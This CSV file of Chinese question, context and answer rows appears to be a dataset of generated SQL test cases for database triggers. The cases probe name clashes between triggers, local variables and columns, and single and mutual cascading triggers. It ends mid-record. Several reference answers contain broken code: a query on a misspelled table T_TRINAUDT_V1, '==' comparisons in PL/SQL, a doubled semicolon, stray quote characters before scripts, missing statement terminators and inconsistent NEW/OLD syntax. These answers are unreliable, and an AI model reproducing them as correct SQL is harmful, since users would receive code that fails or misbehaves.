question,context,answer
生成一组测试用例，能够反应触发器名称与局部变量名称冲突的问题,插入后触发器，在触发器中执行更新操作,"‘-- 创建表
CREATE TABLE T_TRINAME_V1(TRI_NAME VARCHAR(20));

-- 创建触发器，触发器名与局部变量名冲突
CREATE OR REPLACE TRIGGER TRI_NAME
AFTER INSERT ON T_TRINAME_V1
FOR EACH ROW
DECLARE 
    TRI_NAME VARCHAR(20) := 'TRI1';
BEGIN
    IF :NEW.TRI_NAME != 'TRI_NAME' THEN
        UPDATE T_TRINAME_V1 SET TRI_NAME = 'updated';
    END IF;
END;

-- 测试插入数据
INSERT INTO T_TRINAME_V1 VALUES ('test1');
INSERT INTO T_TRINAME_V1 VALUES ('test2');

-- 查询数据以观察触发器效果
SELECT * FROM T_TRINAUDT_V1;"
生成一组测试用例，能够反应触发器名称与局部变量名称冲突的问题,插入前触发器，在触发器中执行更新操作,"-- 创建表
CREATE TABLE T_TRINAME(TRI_NAME VARCHAR(20));

-- 创建触发器，触发器名与局部变量名冲突
CREATE OR REPLACE TRIGGER TRI_NAME
BEFORE INSERT ON T_TRINAME
FOR EACH ROW
DECLARE 
    TRI_NAME VARCHAR(20) := 'TRI1';
BEGIN
    IF :NEW.TRI_NAME != 'TRI_NAME' THEN
        UPDATE T_TRINAME SET TRI_NAME = 'bkjnk';
    END IF;
END;

-- 测试插入数据
INSERT INTO T_TRINAME VALUES ('12');
INSERT INTO T_TRINAME VALUES ('fgreg');

-- 查询数据以观察触发器效果
SELECT * FROM T_TRINAME;"
生成一组测试用例，能够反应列名与触发器名称冲突的问题,插入前触发器，在触发器中执行更新操作,"-- 创建表
CREATE TABLE employee (
    id NUMBER,
    name VARCHAR2(50),
    salary NUMBER
);

-- 创建触发器，其中局部变量名称与列名相同
CREATE OR REPLACE TRIGGER employee_trigger
BEFORE INSERT ON employee
FOR EACH ROW
DECLARE
    id NUMBER := 10000;  -- 这里假设触发器内部的变量名'id'与列名'id'同名，可能会引发混淆
BEGIN
    IF :NEW.id IS NULL THEN
        :NEW.id := id;  -- 设定新插入的行的'id'为局部变量'id'的值
    END IF;
END;

-- 测试 1: 插入没有指定id的数据
INSERT INTO employee (name, salary) VALUES ('Alice Johnson', 75000);
SELECT * FROM employee;  -- 预期输出中的id应为10000，如果正确处理了局部变量与列名的冲突

-- 测试 2: 插入指定id的数据
INSERT INTO employee (id, name, salary) VALUES (2, 'Bob Smith', 50000);
SELECT * FROM employee;  -- 预期输出中的第二行数据id应为2，显示触发器没有覆盖此值"
生成一组测试用例，能够反应列名与局部变量名称冲突的问题,插入前触发器，在触发器中执行更新操作，增加判断条件salary等于某个数，判断salary读取的是列的值还是局部变量的值,"-- 创建表
CREATE TABLE employee (
    id NUMBER,
    name VARCHAR2(50),
    salary NUMBER
);

-- 创建触发器，局部变量名与列名冲突
CREATE OR REPLACE TRIGGER trg_before_insert
BEFORE INSERT ON employee
FOR EACH ROW
DECLARE
    salary NUMBER := 10000;
BEGIN
    if(salary == 15000) then
     update employee set id =2000 where salary = salary;
   end if;
END;

-- 测试插入数据
INSERT INTO employee (id, name, salary) VALUES (1, 'John Doe', 15000);
INSERT INTO employee (id, name, salary) VALUES (2, 'Jane Smith', 12000);

-- 查询数据以观察触发器效果
SELECT * FROM employee;"
生成一组测试用例，能够反应列名与局部变量名称冲突的问题,插入后触发器，在触发器中执行更新操作，增加判断条件salary等于某个数，判断salary读取的是列的值还是局部变量的值,"-- 创建表
CREATE TABLE employee (
    id NUMBER,
    name VARCHAR2(50),
    salary NUMBER
);

-- 创建触发器，局部变量名与列名冲突
CREATE OR REPLACE TRIGGER trg_after_insert
AFTER INSERT ON employee
FOR EACH ROW
DECLARE
    salary NUMBER := 10000;
BEGIN
    if(salary == 15000) then
     update employee set id =2000 where salary = salary;
   end if;
END;

-- 测试插入数据
INSERT INTO employee (id, name, salary) VALUES (1, 'John Doe', 15000);
INSERT INTO employee (id, name, salary) VALUES (2, 'Jane Smith', 12000);

-- 查询数据以观察触发器效果
SELECT * FROM employee;"
生成一组测试用例，能够反应列名与局部变量名称冲突的问题,"插入前触发器，在触发器中执行更新操作，增加判断条件new,salary等于某个值，在更新时条件设置为salary=new.salary，判断是更新了所有行还是与局部变量值相等的行","-- 创建表
CREATE TABLE employee (
    id NUMBER,
    name VARCHAR2(50),
    salary NUMBER
);

-- 创建触发器，局部变量名与列名冲突
CREATE OR REPLACE TRIGGER trg_before_insert
BEFORE INSERT ON employee
FOR EACH ROW
DECLARE
    salary NUMBER := 10000;
BEGIN
    IF :NEW.salary = 15000 THEN
        UPDATE employee SET id = 2000 WHERE salary = :NEW.salary;
    END IF;
END;

-- 测试插入数据
INSERT INTO employee (id, name, salary) VALUES (1, 'John Doe', 15000);
INSERT INTO employee (id, name, salary) VALUES (2, 'Jane Smith', 10000);

-- 查询数据以观察触发器效果
SELECT * FROM employee;"
生成一组测试用例，能够反应列名与局部变量名称冲突的问题,"插入后触发器，在触发器中执行更新操作，增加判断条件new,salary等于某个值，在更新时条件设置为salary=new.salary，判断是更新了所有行还是与局部变量值相等的行","‘-- 创建表
CREATE TABLE employee (
    id NUMBER,
    name VARCHAR2(50),
    salary NUMBER
);

-- 创建触发器，局部变量名与列名冲突
CREATE OR REPLACE TRIGGER trg_after_insert
AFTER INSERT ON employee
FOR EACH ROW
DECLARE
    salary NUMBER := 10000;
BEGIN
    IF :NEW.salary = 15000 THEN
        UPDATE employee SET id = 2000 WHERE salary = :NEW.salary;
    END IF;
END;

-- 测试插入数据
INSERT INTO employee (id, name, salary) VALUES (1, 'John Doe', 15000);
INSERT INTO employee (id, name, salary) VALUES (2, 'Jane Smith', 12000);

-- 查询数据以观察触发器效果
SELECT * FROM employee;"
生成一组测试用例，能够反应列名与局部变量名称冲突的问题,更新前触发器，在触发器中执行插入操作，判断条件为名称=某数，判断将其读取为列名还是局部变量名,"‘-- 创建表
CREATE TABLE employee (
    id NUMBER,
    name VARCHAR2(50),
    salary NUMBER
);

CREATE TABLE employee_copy (
    id NUMBER,
    salary NUMBER
);

-- 创建触发器，局部变量名与列名冲突
CREATE OR REPLACE TRIGGER trg_before_update
BEFORE UPDATE ON employee
FOR EACH ROW
DECLARE
    salary NUMBER := 10000;
BEGIN
    IF salary = 15000 THEN
        INSERT INTO employee_copy values(NEW.id, NEW.salary);
    END IF;
END;

-- 测试插入数据
INSERT INTO employee (id, name, salary) VALUES (1, 'John Doe', 15000);
INSERT INTO employee (id, name, salary) VALUES (2, 'Jane Smith', 10000);

-- 查询数据以观察触发器效果
SELECT * FROM employee;
SELECT * FROM employee_copy;"
生成一组测试用例，能够反应列名与局部变量名称冲突的问题,更新后触发器，在触发器中执行插入操作，判断条件为名称=某数，判断将其读取为列名还是局部变量名,"-- 创建表
CREATE TABLE employee (
    id NUMBER,
    name VARCHAR2(50),
    salary NUMBER
);

CREATE TABLE employee_copy (
    id NUMBER,
    salary NUMBER
);

-- 创建触发器，局部变量名与列名冲突
CREATE OR REPLACE TRIGGER trg_after_update
AFTER UPDATE ON employee
FOR EACH ROW
DECLARE
    salary NUMBER := 10000;
BEGIN
    IF salary = 15000 THEN
        INSERT INTO employee_copy values(NEW.id, NEW.salary);
    END IF;
END;

-- 测试插入数据
INSERT INTO employee (id, name, salary) VALUES (1, 'John Doe', 15000);
INSERT INTO employee (id, name, salary) VALUES (2, 'Jane Smith', 10000);

-- 查询数据以观察触发器效果
SELECT * FROM employee;
SELECT * FROM employee_copy;"
生成一组测试用例，能够反应列名与局部变量名称冲突的问题,删除前触发器，在触发器中执行插入操作，判断条件为名称=某数，判断将其读取为列名还是局部变量名,"‘-- 创建表
DROP TABLE employee;
CREATE TABLE employee (
    id NUMBER,
    name VARCHAR2(50),
    salary NUMBER
);

-- 创建触发器，局部变量名与列名冲突
CREATE OR REPLACE TRIGGER trg_before_delete
BEFORE DELETE ON employee
FOR EACH ROW
DECLARE
    salary NUMBER := 10000;
BEGIN
    IF salary = 10000 THEN ----对该值进行修改，设置与上述值相同或不同的值，如：10000，12000，观察结果的变化
        INSERT INTO employee values(OLD.id, OLD.name, OLD.salary);
    END IF;
END;

-- 测试插入数据
INSERT INTO employee (id, name, salary) VALUES (1, 'John Doe', 15000);
INSERT INTO employee (id, name, salary) VALUES (2, 'Jane Smith', 10000);
DELETE FROM EMPLOYEE WHERE id = 1;

-- 查询数据以观察触发器效果
SELECT * FROM employee;"
生成一组测试用例，能够反应列名与局部变量名称冲突的问题,删除后触发器，在触发器中执行插入操作，判断条件为名称=某数，判断将其读取为列名还是局部变量名,"‘-- 创建表
DROP TABLE employee;
CREATE TABLE employee (
    id NUMBER,
    name VARCHAR2(50),
    salary NUMBER
);

-- 创建触发器，局部变量名与列名冲突
CREATE OR REPLACE TRIGGER trg_after_delete
AFTER DELETE ON employee
FOR EACH ROW
DECLARE
    salary NUMBER := 10000;
BEGIN
    IF salary = 10000 THEN ----对该值进行修改，设置与上述值相同或不同的值，如：10000，12000，观察结果的变化
        INSERT INTO employee values(OLD.id, OLD.name, OLD.salary);
    END IF;
END;

-- 测试插入数据
INSERT INTO employee (id, name, salary) VALUES (1, 'John Doe', 15000);
INSERT INTO employee (id, name, salary) VALUES (2, 'Jane Smith', 10000);
DELETE FROM EMPLOYEE WHERE id = 1;

-- 查询数据以观察触发器效果
SELECT * FROM employee;"
生成一组测试用例，涉及到单个触发器的级联调用,插入前触发器,"-- 创建表
CREATE TABLE t1 (id int,name varchar(20));
--创建触发器
CREATE OR REPLACE TRIGGER tri_ins
BEFORE INSERT ON t1
FOR EACH ROW 
BEGIN 
 INSERT INTO t1 values(1,12);
END;

-- 测试插入数据
INSERT INTO t1 values(2,2);"
生成一组测试用例，涉及到单个触发器的级联调用,插入后触发器,"-- 创建表
CREATE TABLE t1 (id int,name varchar(20));
--创建触发器
CREATE OR REPLACE TRIGGER tri_ins
AFTER INSERT ON t1
FOR EACH ROW 
BEGIN 
 INSERT INTO t1 values(1,12);
END;

-- 测试插入数据
INSERT INTO t1 values(2,2);"
生成一组测试用例，涉及到单个触发器的级联调用,更新前触发器,"‘-- 创建表
CREATE TABLE t1 (id int,name varchar(20));
--创建触发器
CREATE OR REPLACE TRIGGER tri_uga
BEFORE UPDATE ON t1
FOR EACH ROW 
BEGIN 
 UPDATE T1 SET NAME ='DSS' WHERE ID = 1;
END;

-- 插入数据
INSERT INTO t1 values(1,2);

--测试触发触发器，确保触发值是表中的数据
UPDATE T1 SET NAME ='DSS' WHERE ID = 1;
--查询数据
SELECT * FROM T1;"
生成一组测试用例，涉及到单个触发器的级联调用,更新后触发器,"‘-- 创建表
CREATE TABLE t1 (id int,name varchar(20));
--创建触发器
CREATE OR REPLACE TRIGGER tri_uga
AFTER UPDATE ON t1
FOR EACH ROW 
BEGIN 
 UPDATE T1 SET NAME ='DSS' WHERE ID = 1;
END;

-- 插入数据
INSERT INTO t1 values(1,2);

--测试触发触发器，确保触发值是表中的数据
UPDATE T1 SET NAME ='DSS' WHERE ID = 1;
--查询数据
SELECT * FROM T1;"
生成一组测试用例，涉及到单个触发器的级联调用,删除前触发器,"‘-- 创建表
CREATE TABLE t1 (id int,name varchar(20));
--创建触发器
CREATE OR REPLACE TRIGGER tri_del
BEFORE DELETE ON t1
FOR EACH ROW 
BEGIN 
 DELETE T1 WHERE ID = OLD.id;;
END;

-- 插入数据
INSERT INTO t1 values(1,2);

--测试触发触发器，确保触发值是表中的值
DELETE T1 WHERE ID = 1;
--查询数据
SELECT * FROM T1;"
生成一组测试用例，涉及到单个触发器的级联调用,插入或更新前触发器，在触发器中执行插入，导致级联触发,"---创建表
create TABLE t1(id int, age int);
--插入数据
INSERT INTO t1 values(1,12);

--创建触发器
CREATE OR replace TRIGGER tri_t1
BEFORE INSERT OR UPDATE  ON t1
FOR EACH ROW 
BEGIN 
 INSERT INTO t1 values(123,121);
END

-- 测试插入数据
INSERT INTO t1 values(2,13);
INSERT INTO t1 values(3,14);

--测试更新数据
UPDATE t1 SET age = 20 WHERE id = 1;

--查询数据
SELECT * FROM t1;"
生成一组测试用例，涉及到单个触发器的级联调用,插入或更新前触发器，在触发器中执行更新，导致级联触发,"--创建表
DROP TABLE t1;
create TABLE t1(id int, age int);
--插入数据
INSERT INTO t1 values(1,12);

--创建触发器
CREATE OR replace TRIGGER tri_t1
BEFORE INSERT OR UPDATE ON t1
FOR EACH ROW 
BEGIN
 UPDATE t1 SET age = 20 WHERE id = 1;
END

-- 测试插入数据
INSERT INTO t1 values(2,13);
INSERT INTO t1 values(3,14);

--测试更新数据
UPDATE t1 SET age = 20 WHERE id = 1;

--查询数据
SELECT * FROM t1;"
生成一组测试用例，涉及到单个触发器的级联调用,插入或更新前触发器，在触发器中根据判断条件选择执行插入或更新，导致级联触发,"‘--创建表
create TABLE t1(id int, age int);
--插入数据
INSERT INTO t1 values(1,12);
INSERT INTO t1 values(2,13);

--创建触发器
CREATE OR replace TRIGGER tri_t1
BEFORE INSERT OR UPDATE ON t1
FOR EACH ROW 
BEGIN
 IF mod(NEW.id, 2) = 1 THEN 
  INSERT INTO t1 values(123,121);
 ELSE
  UPDATE t1 SET age = 20 WHERE id = 1;
 END IF;
END

-- 测试插入数据
INSERT INTO t1 values(3,14);
INSERT INTO t1 values(4,15);
UPDATE t1 SET age = 13 WHERE id = 1;
UPDATE t1 SET age = 13 WHERE id = 2;

--查询数据
SELECT * FROM t1;"
生成一组测试用例，涉及到单个触发器的级联调用,插入或更新后触发器，在触发器中执行插入，导致级联触发,"---创建表
create TABLE t1(id int, age int);
--插入数据
INSERT INTO t1 values(1,12);

--创建触发器
CREATE OR replace TRIGGER tri_t1
AFTER INSERT OR UPDATE  ON t1
FOR EACH ROW 
BEGIN 
 INSERT INTO t1 values(123,121);
END

-- 测试插入数据
INSERT INTO t1 values(2,13);
INSERT INTO t1 values(3,14);

--测试更新数据
UPDATE t1 SET age = 20 WHERE id = 1;

--查询数据
SELECT * FROM t1;"
生成一组测试用例，涉及到单个触发器的级联调用,插入或更新后触发器，在触发器中执行更新，导致级联触发,"--创建表
DROP TABLE t1;
create TABLE t1(id int, age int);
--插入数据
INSERT INTO t1 values(1,12);

--创建触发器
CREATE OR replace TRIGGER tri_t1
AFTER INSERT OR UPDATE ON t1
FOR EACH ROW 
BEGIN
 UPDATE t1 SET age = 20 WHERE id = 1;
END

-- 测试插入数据
INSERT INTO t1 values(2,13);
INSERT INTO t1 values(3,14);

--测试更新数据
UPDATE t1 SET age = 20 WHERE id = 1;

--查询数据
SELECT * FROM t1;"
生成一组测试用例，涉及到单个触发器的级联调用,插入或更新后触发器，在触发器中根据判断条件选择执行插入或更新，导致级联触发,"‘--创建表
create TABLE t1(id int, age int);
--插入数据
INSERT INTO t1 values(1,12);
INSERT INTO t1 values(2,13);

--创建触发器
CREATE OR replace TRIGGER tri_t1
AFTER INSERT OR UPDATE ON t1
FOR EACH ROW 
BEGIN
 IF mod(NEW.id, 2) = 1 THEN 
  INSERT INTO t1 values(123,121);
 ELSE
  UPDATE t1 SET age = 20 WHERE id = 1;
 END IF;
END

-- 测试插入数据
INSERT INTO t1 values(3,14);
INSERT INTO t1 values(4,15);
UPDATE t1 SET age = 13 WHERE id = 1;
UPDATE t1 SET age = 13 WHERE id = 2;

--查询数据
SELECT * FROM t1;"
生成一组测试用例，涉及到单个触发器的级联调用,插入或删除前触发器，在触发器中进行插入操作，导致级联触发,"‘--创建表
create TABLE t1(id int, age int);
--插入数据
INSERT INTO t1 values(1,12);

--创建触发器
CREATE OR replace TRIGGER tri_t1
BEFORE INSERT OR DELETE ON t1
FOR EACH ROW 
BEGIN
 INSERT INTO t1 values(123,123);
END

-- 测试插入数据
INSERT INTO t1 values(2,13);
INSERT INTO t1 values(3,14);

--测试删除数据，确保数据在表中存在
DELETE FROM t1 WHERE id = 1;

--查询数据
SELECT * FROM t1;"
生成一组测试用例，涉及到单个触发器的级联调用,插入或删除前触发器，在触发器中进行删除操作，导致级联触发,"--创建表
create TABLE t1(id int, age int);
--插入数据
INSERT INTO t1 values(1,12);

--创建触发器
CREATE OR replace TRIGGER tri_t1
BEFORE INSERT OR DELETE ON t1
FOR EACH ROW 
BEGIN
 DELETE FROM t1 WHERE id = OLD.id;
END

--测试删除数据，插入不会引发触发
DELETE FROM t1 WHERE id = 3;

--查询数据
SELECT * FROM t1;"
生成一组测试用例，涉及到单个触发器的级联调用,插入或删除前触发器，在触发器中根据判断条件选择执行插入或更新，导致级联触发,"--创建表
create TABLE t1(id int, age int);
--插入数据
INSERT INTO t1 values(1,12);

--创建触发器
CREATE OR replace TRIGGER tri_t1
BEFORE INSERT OR DELETE ON t1
FOR EACH ROW 
BEGIN
 IF NEW.id > 0 THEN 
  INSERT INTO t1 values(123,121);
 END IF;
 IF OLD.id > 0 THEN 
  DELETE FROM t1 WHERE id = OLD.id;
 END IF;
END

-- 测试插入数据
INSERT INTO t1 values(2,13);
INSERT INTO t1 values(3,14);

--测试删除数据，确保数据在表中存在
DELETE FROM t1 WHERE id = 3;

--查询数据
SELECT * FROM t1;"
生成一组测试用例，涉及到单个触发器的级联调用,插入或删除后触发器，在触发器中进行插入操作，导致级联触发，在触发器中进行删除操作，不会导致级联触发,"--创建表
create TABLE t1(id int, age int);
--插入数据
INSERT INTO t1 values(1,12);

--创建触发器
CREATE OR replace TRIGGER tri_t1
AFTER INSERT OR DELETE ON t1
FOR EACH ROW 
BEGIN
 INSERT INTO t1 values(123,123);
END

-- 测试插入数据
INSERT INTO t1 values(2,13);
INSERT INTO t1 values(3,14);

--测试删除数据，确保数据在表中存在
DELETE FROM t1 WHERE id = 4;

--查询数据
SELECT * FROM t1;"
生成一组测试用例，涉及到单个触发器的级联调用,插入或删除后触发器，在触发器中根据判断条件选择执行插入或删除，导致级联触发，但是在触发器中进行删除操作，不会导致级联触发！,"’--创建表
CREATE TABLE t1(id int, age int);
--插入数据
INSERT INTO t1 values(1,12);

--创建触发器
CREATE OR replace TRIGGER tri_t1
AFTER INSERT OR DELETE ON t1
FOR EACH ROW 
BEGIN
 IF NEW.id > 0 THEN 
  INSERT INTO t1 values(123,121);
 END IF;
 IF OLD.id > 0 THEN 
  DELETE FROM t1 WHERE id = OLD.id;
 END IF;
END

-- 测试插入数据
INSERT INTO t1 values(2,13);
INSERT INTO t1 values(3,14);

--查询数据
SELECT * FROM t1;"
生成一组测试用例，涉及到单个触发器的级联调用,更新或删除前触发器，在触发器中进行更新操作，导致级联触发,"--创建表
CREATE TABLE t1(id int, age int);
--插入数据
INSERT INTO t1 values(1,12);
INSERT INTO t1 values(2,13);

--创建触发器
CREATE OR replace TRIGGER tri_t1
BEFORE UPDATE OR DELETE ON t1
FOR EACH ROW 
BEGIN
 UPDATE t1 SET age = 43 WHERE id = 1;
END

-- 测试更新数据
UPDATE t1 SET age = 23 WHERE id = 2;
UPDATE t1 SET age = 43 WHERE id = 1;

--测试删除数据，确保数据在表中存在
DELETE FROM t1 WHERE id = 1;

--查询数据
SELECT * FROM t1;"
生成一组测试用例，涉及到单个触发器的级联调用,更新或删除前触发器，在触发器中进行删除操作，导致级联触发,"--创建表
CREATE TABLE t1(id int, name varchar(20));
--插入数据
INSERT INTO t1 values(1,'jkg');
INSERT INTO t1 values(2,'dsgd');

--创建触发器
CREATE OR replace TRIGGER tri_t1
BEFORE UPDATE OR DELETE ON t1
FOR EACH ROW 
BEGIN
 DELETE FROM t1 WHERE id = OLD.id;
END

-- 测试更新数据
UPDATE t1 SET name = 'Alice' WHERE id = 2;
UPDATE t1 SET name = 'Jhon' WHERE id = 1;

--测试删除数据，确保数据在表中存在
DELETE FROM t1 WHERE id = 1;

--查询数据
SELECT * FROM t1;"
生成一组测试用例，涉及到单个触发器的级联调用,更新或删除前触发器，在触发器中根据判断条件选择执行更新或删除，导致级联触发,"‘--创建表
CREATE TABLE t1(id int, age int);
--插入数据
INSERT INTO t1 values(1,12);
INSERT INTO t1 values(2,22);

--创建触发器
CREATE OR replace TRIGGER tri_t1
BEFORE UPDATE OR DELETE ON t1
FOR EACH ROW 
BEGIN
 IF NEW.id > 0 THEN 
  UPDATE t1 SET age = 43 WHERE id = 1;
 END IF;
 IF OLD.id > 0 THEN 
  DELETE FROM t1 WHERE id = OLD.id;
 END IF;
END

-- 测试更新数据
UPDATE t1 SET age = 23 WHERE id = 2;
UPDATE t1 SET age = 43 WHERE id = 1;

--测试删除数据，确保数据在表中存在
DELETE FROM t1 WHERE id = 1;

--查询数据
SELECT * FROM t1;"
生成一组测试用例，涉及到单个触发器的级联调用,更新或删除后触发器，在触发器中进行更新操作，导致级联触发，删除操作不会引发级联触发,"--创建表
CREATE TABLE t1(id int, name varchar(20));
--插入数据
INSERT INTO t1 values(1,'jkg');
INSERT INTO t1 values(2,'dsgd');

--创建触发器
CREATE OR replace TRIGGER tri_t1
AFTER UPDATE OR DELETE ON t1
FOR EACH ROW 
BEGIN
 UPDATE t1 SET name = 'Alice' WHERE id = 2;
END

-- 测试更新数据
UPDATE t1 SET name = 'Alice' WHERE id = 2;
UPDATE t1 SET name = 'Jhon' WHERE id = 1;

--查询数据
SELECT * FROM t1;"
生成一组测试用例，涉及到单个触发器的级联调用,更新或删除后触发器，在触发器中根据判断条件选择执行更新或删除，导致级联触发；删除操作不会引发级联触发,"‘--创建表
CREATE TABLE t1(id int, age int);
--插入数据
INSERT INTO t1 values(1,12);
INSERT INTO t1 values(2,22);

--创建触发器
CREATE OR replace TRIGGER tri_t1
AFTER UPDATE OR DELETE ON t1
FOR EACH ROW 
BEGIN
 IF NEW.id > 0 THEN 
  UPDATE t1 SET age = 43 WHERE id = 1;
 END IF;
 IF OLD.id > 0 THEN 
  DELETE FROM t1 WHERE id = OLD.id;
 END IF;
END

-- 测试更新数据
UPDATE t1 SET age = 23 WHERE id = 2;
UPDATE t1 SET age = 43 WHERE id = 1;

--测试删除数据，确保数据在表中存在
DELETE FROM t1 WHERE id = 1;

--查询数据
SELECT * FROM t1;"
生成一组测试用例，涉及到单个触发器的级联调用,插入或更新或删除前触发器，在触发器中执行插入操作，导致级联触发,"‘--创建表
CREATE TABLE t1(id int, age int);
--插入数据
INSERT INTO t1 values(1,12);
INSERT INTO t1 values(2,13);

--创建触发器
CREATE OR replace TRIGGER tri_t1
BEFORE INSERT OR UPDATE OR DELETE ON t1
FOR EACH ROW 
BEGIN
 INSERT INTO t1 values(2,12);
END

-- 测试插入数据
INSERT INTO t1 values(2,13);

-- 测试更新数据
UPDATE t1 SET age = 43 WHERE id = 1;

--测试删除数据，确保数据在表中存在
DELETE FROM t1 WHERE id = 1;

--查询数据
SELECT * FROM t1;"
生成一组测试用例，涉及到单个触发器的级联调用,插入或更新或删除前触发器，在触发器中执行更新操作，导致级联触发,"--创建表
CREATE TABLE t1(id int, name varchar(20));
--插入数据
INSERT INTO t1 values(1,'Alice');
INSERT INTO t1 values(2,'Top');

--创建触发器
CREATE OR replace TRIGGER tri_t1
BEFORE INSERT OR UPDATE OR DELETE ON t1
FOR EACH ROW 
BEGIN
 UPDATE t1 SET name = 'David' WHERE id = 1;
END

-- 测试插入数据
INSERT INTO t1 values(3,'Mary');

-- 测试更新数据
UPDATE t1 SET name = 'David' WHERE id = 2;

--测试删除数据，确保数据在表中存在
DELETE FROM t1 WHERE id = 1;

--查询数据
SELECT * FROM t1;"
生成一组测试用例，涉及到单个触发器的级联调用,插入或更新或删除前触发器，在触发器中执行删除操作，导致级联触发,"‘--创建表
CREATE TABLE t1(id int, name varchar(20));
--插入数据
INSERT INTO t1 values(1,'Alice');
INSERT INTO t1 values(2,'Top');

--创建触发器
CREATE OR replace TRIGGER tri_t1
BEFORE INSERT OR UPDATE OR DELETE ON t1
FOR EACH ROW 
BEGIN
 DELETE FROM t1 WHERE id = 1;
END

-- 测试插入数据
INSERT INTO t1 values(3,'Mary');

-- 测试更新数据
UPDATE t1 SET name = 'David' WHERE id = 2;

--测试删除数据，确保数据在表中存在
DELETE FROM t1 WHERE id = 1;

--查询数据
SELECT * FROM t1;"
生成一组测试用例，涉及到单个触发器的级联调用,插入或更新或删除后触发器，在触发器中执行插入操作，导致级联触发,"‘--创建表
CREATE TABLE t1(id int, name varchar(20));
--插入数据
INSERT INTO t1 values(1,'Alice');
INSERT INTO t1 values(2,'Top');

--创建触发器
CREATE OR replace TRIGGER tri_t1
AFTER INSERT OR UPDATE OR DELETE ON t1
FOR EACH ROW 
BEGIN
 INSERT INTO t1 values(3,'Mary');
END

-- 测试插入数据
INSERT INTO t1 values(3,'Mary');

-- 测试更新数据
UPDATE t1 SET name = 'David' WHERE id = 2;

--测试删除数据，确保数据在表中存在
DELETE FROM t1 WHERE id = 1;

--查询数据
SELECT * FROM t1;"
生成一组测试用例，涉及到单个触发器的级联调用,插入或更新或删除后触发器，在触发器中执行更新操作，导致级联触发；删除操作不会引发级联触发,"‘--创建表
CREATE TABLE t1(id int, name varchar(20));
--插入数据
INSERT INTO t1 values(1,'Alice');
INSERT INTO t1 values(2,'Top');

--创建触发器
CREATE OR replace TRIGGER tri_t1
AFTER INSERT OR UPDATE OR DELETE ON t1
FOR EACH ROW 
BEGIN
 UPDATE t1 SET name = 'David' WHERE id = 1;
END

-- 测试插入数据
INSERT INTO t1 values(3,'Mary');

-- 测试更新数据
UPDATE t1 SET name = 'David' WHERE id = 2;

--查询数据
SELECT * FROM t1;"
生成一组测试用例，涉及到单个触发器的级联调用,插入或更新或删除后触发器，在触发器中根据判断条件选择执行插入或更新或删除，导致级联触发；但删除操作不会引发级联触发,"--创建表
CREATE TABLE t1(id int, name varchar(20));
--插入数据
INSERT INTO t1 values(1,'Alice');
INSERT INTO t1 values(2,'Top');

--创建触发器
CREATE OR replace TRIGGER tri_t1
AFTER INSERT OR UPDATE OR DELETE ON t1
FOR EACH ROW 
BEGIN
 IF NEW.id = 3 THEN 
  INSERT INTO t1 values(3,'test');
 END IF;
 IF NEW.id = 2 THEN
  UPDATE t1 SET name = 'Judy' WHERE id = 2;
 END IF;
 IF OLD.id > 0 THEN 
  DELETE FROM t1 WHERE id = OLD.id;
 END IF;
END

-- 测试插入数据
INSERT INTO t1 values(3,'Mary');

-- 测试更新数据
UPDATE t1 SET name = 'David' WHERE id = 2;

--查询数据
SELECT * FROM t1;"
生成一组测试用例，涉及到多个触发器的级联调用,触发器1插入前触发器，触发器2插入前触发器，相互触发,"‘--创建表
create TABLE t1(id int, age int);
CREATE TABLE t2(id int, income int);

--创建触发器1
CREATE OR replace TRIGGER tri_ins_t1
BEFORE INSERT ON t1
FOR EACH ROW 
BEGIN 
 INSERT INTO t2 values(NEW.id, NEW.age * 1000);
END

--创建触发器2
CREATE OR replace TRIGGER tri_ins_t2
BEFORE INSERT ON t2
FOR EACH ROW 
BEGIN 
 INSERT INTO t1 values(NEW.id, NEW.income / 1000);
END

-- 测试插入数据
INSERT INTO t1 values(1,12);
INSERT INTO t2 values(1,12);

--查询数据
SELECT * FROM t1;
SELECT * FROM t2;"
生成一组测试用例，涉及到多个触发器的级联调用,触发器1插入前触发器，触发器2插入后触发器，相互触发,"‘--创建表
create TABLE t1(id int, age int);
CREATE TABLE t2(id int, income int);

--创建触发器1
CREATE OR replace TRIGGER tri_ins_t1
BEFORE INSERT ON t1
FOR EACH ROW 
BEGIN 
 INSERT INTO t2 values(NEW.id, NEW.age * 1000);
END

--创建触发器2
CREATE OR replace TRIGGER tri_ins_t2
AFTER INSERT ON t2
FOR EACH ROW 
BEGIN 
 INSERT INTO t1 values(NEW.id, NEW.income / 1000);
END

-- 测试插入数据
INSERT INTO t1 values(1,12);
INSERT INTO t2 values(1,12);

--查询数据
SELECT * FROM t1;
SELECT * FROM t2;"
生成一组测试用例，涉及到多个触发器的级联调用,触发器1插入后触发器，触发器2插入后触发器，相互触发,"‘--创建表
create TABLE t1(id int, age int);
CREATE TABLE t2(id int, income int);

--创建触发器1
CREATE OR replace TRIGGER tri_ins_t1
AFTER INSERT ON t1
FOR EACH ROW 
BEGIN 
 INSERT INTO t2 values(NEW.id, NEW.age * 1000);
END

--创建触发器2
CREATE OR replace TRIGGER tri_ins_t2
AFTER INSERT ON t2
FOR EACH ROW 
BEGIN 
 INSERT INTO t1 values(NEW.id, NEW.income / 1000);
END

-- 测试插入数据
INSERT INTO t1 values(1,12);
INSERT INTO t2 values(1,12);

--查询数据
SELECT * FROM t1;
SELECT * FROM t2;"
生成一组测试用例，涉及到多个触发器的级联调用,触发器1更新前触发器，触发器2更新前触发器,"’--创建表
create TABLE t1(id int, age int);
CREATE TABLE t2(id int, income int);

--创建触发器1
CREATE OR replace TRIGGER tri_upa_t1
BEFORE UPDATE ON t1
FOR EACH ROW 
BEGIN 
 UPDATE t2 SET income = NEW.age * 1000 WHERE id = 1;
END

--创建触发器2
CREATE OR replace TRIGGER tri_upa_t2
BEFORE UPDATE ON t2
FOR EACH ROW 
BEGIN 
 UPDATE t1 SET age = NEW.income / 1000 WHERE id = 1;
END

-- 插入数据
INSERT INTO t1 values(1,12);
INSERT INTO t2 values(1,12000);
INSERT INTO t1 values(2,13);
INSERT INTO t2 values(2,13000);

--测试触发触发器，保证触发的值在表中是存在的
UPDATE t1 SET age = 13 WHERE id = 1;
UPDATE t2 SET income = 12000 WHERE id = 2;

--查询数据
SELECT * FROM t1;
SELECT * FROM t2;"
生成一组测试用例，涉及到多个触发器的级联调用,触发器1更新前触发器，触发器2更新后触发器,"’--创建表
create TABLE t1(id int, age int);
CREATE TABLE t2(id int, income int);

--创建触发器1
CREATE OR replace TRIGGER tri_upa_t1
BEFORE UPDATE ON t1
FOR EACH ROW 
BEGIN 
 UPDATE t2 SET income = NEW.age * 1000 WHERE id = 1;
END

--创建触发器2
CREATE OR replace TRIGGER tri_upa_t2
AFTER UPDATE ON t2
FOR EACH ROW 
